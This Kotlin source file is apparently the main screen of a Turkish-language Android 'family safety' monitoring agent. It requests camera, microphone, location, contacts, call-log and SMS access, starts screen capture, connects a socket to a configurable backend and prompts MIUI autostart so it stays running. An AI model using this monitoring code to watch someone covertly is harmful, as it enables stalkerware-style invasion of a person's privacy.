package com.familysafety.agent

import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {

    private lateinit var projectionManager: MediaProjectionManager
    private lateinit var tvStatus: TextView

    private val dangerousPermissions: Array<String> by lazy {
        buildList {
            add(android.Manifest.permission.CAMERA)
            add(android.Manifest.permission.RECORD_AUDIO)
            add(android.Manifest.permission.ACCESS_FINE_LOCATION)
            add(android.Manifest.permission.READ_CONTACTS)
            add(android.Manifest.permission.READ_CALL_LOG)
            add(android.Manifest.permission.READ_SMS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(android.Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    // Modern permission launcher — replaces requestPermissions + onRequestPermissionsResult
    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val denied = results.filterValues { !it }.keys
        if (denied.isEmpty()) {
            onAllPermissionsGranted()
        } else {
            showRationaleDialog(denied)
        }
        updateStatus()
    }

    // Modern screen capture launcher — replaces startActivityForResult + onActivityResult
    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            val serviceIntent = Intent(this, MainService::class.java).apply {
                putExtra("resultCode", result.resultCode)
                putExtra("data", result.data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            Toast.makeText(this, "İzleme Başlatıldı", Toast.LENGTH_LONG).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.e("FSA", "MainActivity onCreate başladı")
        try {
            setContentView(R.layout.activity_main)

            projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            tvStatus = findViewById(R.id.tvStatus)

            val etUrl     = findViewById<EditText>(R.id.etBackendUrl)
            val etProfile = findViewById<EditText>(R.id.etProfileId)
            val btnSave   = findViewById<Button>(R.id.btnSave)
            val btnPerm   = findViewById<Button>(R.id.btnPermission)
            val btnStart  = findViewById<Button>(R.id.btnStartService)

            val prefs = getSharedPreferences("config", MODE_PRIVATE)
            Config.backendUrl = prefs.getString("backend_url", Config.backendUrl) ?: Config.backendUrl
            Config.profileId  = prefs.getString("profile_id",  Config.profileId)  ?: Config.profileId

            etUrl.setText(Config.backendUrl)
            etProfile.setText(Config.profileId)

            btnSave.setOnClickListener {
                Config.backendUrl = etUrl.text.toString().trimEnd('/')
                Config.profileId  = etProfile.text.toString().trim()
                prefs.edit()
                    .putString("backend_url", Config.backendUrl)
                    .putString("profile_id",  Config.profileId)
                    .apply()
                Toast.makeText(this, "Ayarlar Kaydedildi", Toast.LENGTH_SHORT).show()
                updateStatus()
            }

            btnPerm.setOnClickListener {
                startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
            }

            btnStart.setOnClickListener {
                if (!allPermissionsGranted()) {
                    permissionLauncher.launch(dangerousPermissions)
                } else {
                    screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
                }
            }

            // İlk açılışta otomatik izin iste
            if (!allPermissionsGranted()) {
                permissionLauncher.launch(dangerousPermissions)
            } else {
                connectSocketIfNeeded()
            }

            updateStatus()
            Log.e("FSA", "MainActivity onCreate tamamlandı")
        } catch (e: Exception) {
            Log.e("FSA", "MainActivity onCreate HATA: ${e.message}", e)
        }
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
        // Ayarlar'dan döndükten sonra izinleri tekrar kontrol et
        if (allPermissionsGranted()) {
            connectSocketIfNeeded()
        }
        checkMiuiAutostart()
    }

    // ── İzin yardımcıları ────────────────────────────────────────────────────

    private fun allPermissionsGranted() = dangerousPermissions.all {
        checkSelfPermission(it) == PackageManager.PERMISSION_GRANTED
    }

    private fun onAllPermissionsGranted() {
        Toast.makeText(this, "Tüm izinler verildi ✓", Toast.LENGTH_SHORT).show()
        connectSocketIfNeeded()
    }

    private fun connectSocketIfNeeded() {
        if (!SocketManager.isSignalConnected()) {
            Thread { SocketManager.connect(this@MainActivity) }.start()
        }
    }

    private fun showRationaleDialog(denied: Set<String>) {
        val descriptions = denied.joinToString("\n") { perm ->
            when {
                perm.contains("CAMERA")       -> "📷 Kamera — canlı video akışı"
                perm.contains("RECORD_AUDIO") -> "🎙 Mikrofon — ses dinleme"
                perm.contains("LOCATION")     -> "📍 Konum — anlık takip"
                perm.contains("CONTACTS")     -> "👥 Kişiler — iletişim analizi"
                perm.contains("CALL_LOG")     -> "📞 Arama geçmişi — analiz"
                perm.contains("SMS")          -> "💬 SMS — mesaj izleme"
                perm.contains("NOTIFICATIONS")-> "🔔 Bildirimler — uyarı göndermek"
                else -> perm.substringAfterLast('.')
            }
        }

        // Kalıcı red: shouldShowRequestPermissionRationale == false (2. reddedme)
        val permanentlyDenied = denied.filter { !shouldShowRequestPermissionRationale(it) }
        val goToSettings = permanentlyDenied.isNotEmpty()

        val message = buildString {
            append("Uygulama şu izinlere ihtiyaç duyuyor:\n\n")
            append(descriptions)
            if (goToSettings) {
                append("\n\nBazı izinler kalıcı olarak reddedildi. Ayarlar'dan manuel verin.")
            }
        }

        AlertDialog.Builder(this)
            .setTitle("İzinler Gerekli")
            .setMessage(message)
            .setPositiveButton(if (goToSettings) "Ayarlara Git" else "Tekrar İste") { _, _ ->
                if (goToSettings) openAppSettings() else permissionLauncher.launch(denied.toTypedArray())
            }
            .setNegativeButton("Şimdi Değil", null)
            .show()
    }

    private fun openAppSettings() {
        startActivity(Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
            data = Uri.fromParts("package", packageName, null)
        })
    }

    // ── MIUI Autostart ───────────────────────────────────────────────────────

    private fun checkMiuiAutostart() {
        val manufacturer = Build.MANUFACTURER.lowercase()
        if (!manufacturer.contains("xiaomi") && !manufacturer.contains("redmi") &&
            !manufacturer.contains("poco")) return

        val prefs = getSharedPreferences("config", MODE_PRIVATE)
        if (prefs.getBoolean("miui_autostart_shown", false)) return

        AlertDialog.Builder(this)
            .setTitle("MIUI Autostart Gerekli")
            .setMessage(
                "Xiaomi/MIUI cihazlarda arka planda çalışmak için:\n\n" +
                "Ayarlar → Uygulamalar → Uygulamaları Yönet\n" +
                "→ FamilySafety → Autostart → Aç\n\n" +
                "Bu ayar yapılmazsa uygulama yeniden başlatmadan sonra çalışmayabilir."
            )
            .setPositiveButton("Autostart Ayarına Git") { _, _ ->
                prefs.edit().putBoolean("miui_autostart_shown", true).apply()
                openMiuiAutostart()
            }
            .setNegativeButton("Anladım") { _, _ ->
                prefs.edit().putBoolean("miui_autostart_shown", true).apply()
            }
            .show()
    }

    private fun openMiuiAutostart() {
        val intents = listOf(
            // MIUI 12+
            Intent().setClassName(
                "com.miui.securitycenter",
                "com.miui.permcenter.autostart.AutoStartManagementActivity"
            ),
            // MIUI 10/11
            Intent().setClassName(
                "com.miui.securitycenter",
                "com.miui.securitycenter.MainActivity"
            )
        )
        for (intent in intents) {
            try { startActivity(intent); return } catch (_: Exception) {}
        }
        // Fallback: uygulama detayları
        openAppSettings()
    }

    // ── Durum güncelle ───────────────────────────────────────────────────────

    private fun updateStatus() {
        val listenerOk = isListenerEnabled()
        val allPermsOk = allPermissionsGranted()

        val permLine = if (allPermsOk) {
            "✓ Tüm izinler aktif"
        } else {
            val missing = dangerousPermissions
                .filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
                .map { it.substringAfterLast('.') }
            "✗ Eksik: ${missing.joinToString(", ")}"
        }

        val socketLine = if (SocketManager.isSignalConnected()) "✓ Socket bağlı" else "○ Socket bağlı değil"

        tvStatus.text = buildString {
            append(if (listenerOk) "✓ Bildirim erişimi aktif\n" else "✗ Bildirim erişimi gerekli!\n")
            append("$permLine\n")
            append("$socketLine\n")
            append("Backend: ${Config.backendUrl}\n")
            append("Profil:  ${Config.profileId}")
        }
    }

    private fun isListenerEnabled(): Boolean {
        val flat = Settings.Secure.getString(
            contentResolver, "enabled_notification_listeners"
        ) ?: return false
        return flat.contains(packageName)
    }
}
